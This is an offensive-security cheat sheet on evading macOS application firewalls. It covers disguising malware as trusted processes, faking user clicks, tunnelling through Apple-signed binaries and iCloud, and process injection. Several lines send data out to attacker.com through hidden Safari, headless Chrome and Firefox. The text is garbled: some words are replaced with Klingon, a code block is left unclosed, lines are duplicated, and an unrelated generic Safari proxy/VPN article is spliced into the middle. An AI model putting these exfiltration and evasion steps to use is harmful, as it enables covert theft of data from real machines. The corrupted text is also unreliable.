# macOS Bypassing Firewalls

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Found techniques

The following techniques were found working in some macOS firewall apps.

### Abusing whitelist names

* For example calling the malware with names of well known macOS processes like **`launchd`**&#x20;

### Synthetic Click

* If the firewall ask for permission to the user make the malware **click on allow**

### **Use Apple signed binaries**

* Like **`curl`**, but also others like **`whois`**

### Well known apple domains

The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.

### Generic Bypass

Some ideas to try to bypass firewalls

### Check allowed traffic

Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS vItlhutlh

DNS resolutions **`mdnsreponder`** signed application vItlhutlh contact DNS servers.

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Browser apps qar'a'wI'

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
# Safari

## Introduction

Safari is the default web browser for macOS. It is known for its speed and efficiency, as well as its strong security features. However, there are still ways to bypass its security measures and gain unauthorized access to sensitive information.

## Bypassing Firewalls

### 1. Proxy Servers

One way to bypass firewalls in Safari is by using proxy servers. Proxy servers act as intermediaries between your computer and the websites you visit, allowing you to access blocked content. By configuring Safari to use a proxy server, you can bypass firewall restrictions and access restricted websites.

To configure a proxy server in Safari, follow these steps:

1. Open Safari and go to **Preferences**.
2. Click on the **Advanced** tab.
3. Click on the **Change Settings** button next to **Proxies**.
4. Select the **Web Proxy (HTTP)** option and enter the IP address and port number of the proxy server.
5. Click **OK** to save the changes.

### 2. VPNs

Another way to bypass firewalls in Safari is by using a Virtual Private Network (VPN). A VPN creates a secure connection between your computer and a remote server, encrypting your internet traffic and hiding your IP address. By connecting to a VPN server, you can bypass firewall restrictions and access blocked websites.

To use a VPN in Safari, follow these steps:

1. Install a VPN client on your computer.
2. Open the VPN client and connect to a VPN server.
3. Once connected, open Safari and browse the internet as usual.

## Conclusion

While Safari is a secure web browser, it is still possible to bypass its security measures and gain unauthorized access to sensitive information. By using proxy servers or VPNs, you can bypass firewalls and access blocked content. However, it is important to use these techniques responsibly and ethically.
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## References

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
